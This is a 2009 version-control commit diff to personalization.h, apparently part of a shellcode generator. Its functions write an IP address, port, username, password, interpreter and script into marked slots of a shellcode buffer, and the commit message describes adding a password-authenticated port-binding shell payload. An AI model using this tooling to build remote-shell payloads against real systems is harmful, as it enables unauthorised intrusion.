319b3812042a9e00cd0a0899434c1e778df5dc91
codwizard <codwizard@fc35f583-e7bc-40c1-b2fa-ab0cb1ddbab9>
2009-12-29 18:32:33 +0000

    added working password auth portbind. small changes in personalization funzctions and payloads

--- personalization.h
+++ personalization.h
@@ -20,7 +20,7 @@ void set_ip(char *shellcode, u_int32_t ip)
 }
 
 // port = 16bits unsigned integer
-void set_port(char *shellcode, unsigned short port)
+void set_port(char *shellcode, u_int16_t port)
 {
     char *ptr = NULL;
 
@@ -30,42 +30,40 @@ void set_port(char *shellcode, unsigned short port)
     *(u_int16_t*)ptr = port;
 }
 
-// username = 4 chars
+// username = 3 chars
 void set_username(char *shellcode, char *username)
 {
+    char name[3];
     char *ptr = NULL;
     int name_len = strlen(username);
-    char name[4];
 
-    memset(name, 'a', 4);
+
+    memset(name, 'a', 3);
 
     if(!(ptr = index(shellcode, username_mark))) mark_not_found("username");
 
-    strncpy(name, username, (name_len < 4) ? name_len : 4);
-    strncpy(ptr, name, 4);
+    strncpy(name, username, (name_len < 3) ? name_len : 3);
+    strncpy(ptr, name, 3);
 }
 
 // password = 4 chars
 void set_password(char *shellcode, char *password)
 {
+    char pass[8];
     char *ptr1 = NULL, *ptr2 = NULL;
     int pass_len = strlen(password);
-    char pass[4];
 
-    memset(pass, 'a', 4);
-
-    //0:::D:0::DDDCCCC
-    //    ^    ^
-    //   ptr1 ptr2
+    memset(pass, 'a', 8);
 
     ptr1 = index(shellcode, password_mark);
-    ptr2 = index(ptr1+1, password_mark);
+    ptr2 = index(ptr1+4, password_mark);
     if(!ptr1 || !ptr2) mark_not_found("password");
 
-    strncpy(pass, password, (pass_len < 4) ? pass_len : 4);
+    strncpy(pass, password, (pass_len < 8) ? pass_len : 8);
 
-    *ptr1 = pass[3];
-    strncpy(ptr2, pass, 3);
+    strncpy(ptr1, pass+4, 4);
+    strncpy(ptr2, pass, 4);
+
 }
 
 // interpreter (/bin/bash, /usr/bin/perl, etc...)
@@ -106,8 +104,7 @@ void set_script(char *shellcode, char *_cmd, char *file)
         if(!realloc(sh_buffer, payload_len+1)) exit(-1);
 
         strncpy(ptr, cmd, cmd_len);
-        ptr += cmd_len;
-        *ptr = '\0';
+        *(ptr + cmd_len) = '\0';
     }
     else if(file)
     {
@@ -129,14 +126,7 @@ void set_script(char *shellcode, char *_cmd, char *file)
         rewind(script_file);
 
         for(i=0; i<script_len; i++) *(ptr++) = fgetc(script_file);
-/*
-        while( (_char = fgetc(script_file)) != EOF)
-        {
-            printf("%c", *ptr);////
-            *ptr = _char;
-            ptr++;
-        }
-*/
+
         *(ptr++) = '\0';
 
         fclose(script_file);
@@ -151,7 +141,7 @@ void personalize_shellcode(void)
     if(args.my_port) set_port(sh_buffer, args.my_port);
     if(args.my_username) set_username(sh_buffer, args.my_username);
     if(args.my_password) set_password(sh_buffer, args.my_password);
-    if(args.payload_index == 3)
+    if(args.payload_index == 5)
     {
      set_interpreter(sh_buffer, args.interpreter);
      set_script(sh_buffer, args.script_code, args.script_file);
